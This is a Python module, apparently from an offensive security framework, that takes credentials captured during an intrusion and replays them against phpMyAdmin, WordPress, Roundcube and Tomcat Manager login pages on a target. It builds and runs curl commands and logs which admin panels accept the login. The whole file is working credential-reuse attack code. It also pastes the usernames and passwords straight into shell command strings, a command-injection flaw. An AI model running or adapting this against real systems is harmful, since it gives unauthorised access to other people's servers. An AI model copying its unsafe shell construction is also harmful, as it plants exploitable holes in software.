"""Post-access handler for web-admin credential reuse."""

from __future__ import annotations

from typing import TYPE_CHECKING

from .base import BasePostAccessHandler
from .types import AccessType, PostAccessResult

if TYPE_CHECKING:
    from hydrasight.services.dispatcher import Dispatcher


class WebAdminHandler(BasePostAccessHandler):
    """Credential reuse against common web admin login forms.

    Attempts captured credentials against common admin panels (phpMyAdmin,
    WordPress, Roundcube, Tomcat Manager) via curl POST / HTTP basic auth.
    This is credential reuse, not a brute-forcer.
    """

    access_type = AccessType.WEB_ADMIN

    # Common web login paths and their POST field names.
    _PROFILES: list[dict] = [
        {
            "path": "/phpmyadmin/index.php",
            "user_field": "pma_username",
            "pass_field": "pma_password",
            "success_str": "phpMyAdmin",
            "label": "phpMyAdmin",
        },
        {
            "path": "/wp-login.php",
            "user_field": "log",
            "pass_field": "pwd",
            "success_str": "wp-admin",
            "label": "WordPress",
        },
        {
            "path": "/webmail/index.php",
            "user_field": "_user",
            "pass_field": "_pass",
            "success_str": "roundcube",
            "label": "Roundcube",
        },
        {
            "path": "/manager/html",
            "user_field": None,  # HTTP basic auth
            "pass_field": None,
            "success_str": "tomcat",
            "label": "Tomcat Manager",
        },
    ]

    def execute(
        self,
        dispatcher: Dispatcher,
        target: str,
        lhost: str,
        lport: int,
        cfg: dict,
    ) -> PostAccessResult:
        username = self.session.get("username", "")
        password = self.session.get("password", self.session.get("secret", ""))
        rport = int(self.session.get("rport", 80))
        scheme = "https" if rport == 443 else "http"

        if not (username and password):
            return PostAccessResult.failure(self.access_type, "no credentials in session record")

        self.log.info("web admin post-access: %s@%s:%d", username, target, rport)
        output_parts: list[str] = []
        successes: list[str] = []

        for profile in self._PROFILES:
            url = f"{scheme}://{target}:{rport}{profile['path']}"

            # HTTP Basic Auth path (Tomcat, etc.)
            if profile["user_field"] is None:
                cmd = (
                    f"curl -s -o /dev/null -w '%{{http_code}}' "
                    f"--connect-timeout 8 "
                    f"-u '{username}:{password}' "
                    f"{url} 2>&1"
                )
            else:
                # POST form login
                data = f"{profile['user_field']}={username}&{profile['pass_field']}={password}"
                cmd = (
                    f"curl -s -L --connect-timeout 8 "
                    f"-c /tmp/hs_web_cookie.txt "
                    f"-d '{data}' "
                    f"'{url}' 2>&1"
                )

            try:
                _, response, _ = dispatcher.dispatch(
                    {"tool": "run_command", "args": {"command": cmd}}
                )
            except Exception:  # noqa: BLE001 — isolate a single profile failure
                continue

            if not response:
                continue

            # Detect success
            success = profile["success_str"].lower() in response.lower() or (
                profile["user_field"] is None and response.strip() == "200"
            )

            if success:
                successes.append(f"{profile['label']}: {url}")
                output_parts.append(
                    f"=== {profile['label']} LOGIN SUCCESS ===\n"
                    f"URL: {url}\n"
                    f"User: {username}\n"
                    f"Response sample: {response[:500]}"
                )
            else:
                output_parts.append(f"=== {profile['label']} — no access at {url} ===")

        # Cleanup cookie jar
        try:
            dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": "rm -f /tmp/hs_web_cookie.txt"}}
            )
        except Exception:  # noqa: BLE001 — best-effort cleanup
            pass

        full_output = "\n\n".join(output_parts)
        return PostAccessResult(
            access_type=self.access_type,
            success=bool(successes),
            output=full_output,
            hashes=[],
            credentials=[],
            artifacts=successes,
            notes=(
                f"web admin: {len(successes)} access point(s) confirmed"
                if successes
                else "web admin: no access gained"
            ),
        )
